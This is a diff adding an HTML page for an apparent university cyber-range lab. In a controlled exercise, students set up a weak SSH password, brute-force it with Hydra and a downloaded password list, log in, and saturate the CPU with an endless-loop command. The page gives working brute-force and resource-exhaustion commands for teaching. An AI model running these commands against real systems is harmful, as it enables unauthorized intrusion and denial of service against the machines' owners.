@@ -1,0 +1,117 @@
+<div class="step-detail-title"> Step 3 - Launch attack </div>
+
+<div class="options list-group">
+    <a href="javascript:showStep('lab_step_3_0')" class="list-group-item list-group-item-success ">Create user on Server 2 </a>
+    <div class="lab-step-details" style="" id="lab_step_3_0">
+        <p>Login to server3 Console via SSH using the GENI interface.
+            <br/>We will need to create a ubuntu user on server3 with the password password1. To create the ubuntu user, execute the following command:
+        </p>
+        <div class="lab-code">
+            <p>sudo useradd --create-home ubuntu </p>
+
+        </div>
+        <br/>
+        <p>Now, we need to set a password for the ubuntu user. Execute the following command to set the password for the ubuntu user, and enter the password password1:</p>
+        <div class="lab-code">
+            <p>sudo passwd ubuntu </p>
+
+        </div>
+        <p>You willl be prompted to retype the password again, and once you have entered it twice, you will receive the response passwd: all authentication tokens updated successfully. Go on to the next step to enable password authentication.</p>
+        <br/>
+        <p>To enable password authentication, execute the following command on server for ubuntu user:</p>
+        <div class="lab-code">
+            <p>sudo sed -i "s/.*PasswordAuthentication.*/PasswordAuthentication yes/g" /etc/ssh/sshd_config
+            </p>
+
+        </div>
+        <p>Note: I know that this will replace ALL instances of PasswordAuthentication, including the ones in comments, but fortunately multiple instances of PasswordAuthentication yes in the file won't cause an issue, and this is the cleanest way to do it without vim, so I recommend this method)</p>
+
+        <p>
+            After enabling password authentication, we are going to want to restart the ssh service so that the changes can take effect. Execute the following command to restart the ssh service
+        </p>
+        <div class="lab-code">
+            <p> sudo service sshd restart</p>
+        </div>
+
+        <br/>
+        
+
+    </div>
+
+    <a href="javascript:showStep('lab_step_3_1')" class="list-group-item list-group-item-success ">Launch the attack using Hydra </a>
+    <div class="lab-step-details" style="display: none;" id="lab_step_3_1">
+        <p>Login to attacker3 Console via SSH using the GENI interface.
+            <br/>Download a password list by executing the following command.
+        </p>
+        <div class="lab-code">
+            <p>wget http://zeldor.biz/other/bruteforce/passlist.txt </p>
+
+        </div>
+
+        <br>
+
+        <p>
+            With Hydra and the password list downloaded, navigate to the directory containing the password list and execute the following command, replacing $ip_addr with the IP address of the server that will be attacked. If the server is using a port other than 22, execute the second command, replacing both $ip_addr and $port with the IP address and the port of the server respectively.
+        </p>
+
+        <div class="lab-code">
+            <p>hydra -l ubuntu -P passlist.txt $ip_addr ssh </p>
+        </div>
+        <p><b>example : </b><i>hydra -s $port -l ubuntu -P passlist.txt $ip_addr ssh</i></p>
+        <div class="lab-code">
+            <p>hydra -s $port -l ubuntu -P passlist.txt $ip_addr ssh </p>
+        </div>
+        <p><b>example : </b><i>hydra -s 25412 -l ubuntu -P passlist.txt pc2.lan.sdn.uky.edu ssh</i></p>
+        <p>You host name should be something like below but it should be your server name.</p>
+        <img style="width:50%;" src="/MizzouCyberRange/img/lab2/3_1.png" alt="" />
+        <p>The above step will take some time to execute, but after a bit it should produce a message like this one</p>
+        <img style="width:70%;" src="/MizzouCyberRange/img/lab2/3_2.png" alt="" />
+        <br/><br/>
+        <p>As you can see, the password has been identified as password1, and can be used to log in to server3.</p>
+        
+		<p>Now that you've obtained the server's password, try logging in to the victim machine from the attacking machine by 
+		executing the command ssh ubuntu@$ip_addr. replacing $ip_addr with the IP address of server3. You will be prompted for a
+		 password, enter password1 and you will be logged in successfully.</p>
+		 <br/>
+		 <p>
+		 	After logging in to the server, we'll use a significant amount of resources on it by running a command that will utilize all of our cores but one at 100%. Normally, an attacker might install malicious software to mine cryptocurrency, but we'll use this command so that we can utilize the maximum number of cores on the machine and clearly illustrate the example of overloading a machine. Run the following command on server3
+		 </p>
+		 <div class="lab-code">
+            <p>for i in {1..`nproc --all`}; do while : ; do : ; done & done && echo $!</p>
+        </div>
+        <br/>
+        <p><b>Execute top command to see the resource utilization</b></p>
+        <div class="lab-code">
+            <p>Top</p>
+        </div>
+        
+        <p>What this command does is produces a series of endless loops executing the null command (represented as: in the command above). The number of endless loops produced is equal to the number of processors you have, obtained by the command nproc --all. Please note: The very last bit of the command echoes the process ID of the command running; you'll want to save it for later, so you can kill the process you just started.
+			<br/>After running the command, it should show that your CPU utilization is at 100%(Observe the table top).
+        </p>
+        
+		<img style="width:50%;" src="/MizzouCyberRange/img/lab2/3_3_1.PNG" alt="" />
+        <br/>
+        <p>To create log file for the executed work on server, Login to the server and execute the following commands. On your root user run the following command</p>
+    	<div class="lab-code">
+            <p>sudo usermod -aG sudo ubuntu</p>
+        </div>
+        <p>On ubuntu user run the following commands</p>
+        <div class="lab-code">
+            <p>sudo apt-get install -y dos2unix     #For windows users</p>
+        </div>
+        
+         <p><b>Get create_logs.sh</b> file from the lab modules  and execute the file as follows</p>
+        <div class="lab-code">
+            <p>dos2unix create_logs.sh     #For windows users c</p>
+        </div>
+        
+        <p>Now login to attacker console and copy the file copy_logfiles.sh from the lab modules. Execute the following commands in attacker console</p>
+       <div class="lab-code"> <p>sudo bash ./copy_logfiles.sh username hostname -p port</p></div>
+       <p><b>Example:</b><i> sudo bash ./copy_logfiles.sh ubuntu1 10.0.0.102 -p 29203</i></p>
+       
+       <p>
+       To kill the process, type kill -9 $pid, replacing $pid with the process ID you saved from earlier. Then, execute the resource_utilization.sh script again. You'll notice that the CPU usage percentage has gone down significantly, and the bash process is gone. At this point, you've completed the attack, and have executed code on another machine from your machine!
+       </p>
+    </div>
+
+</div>
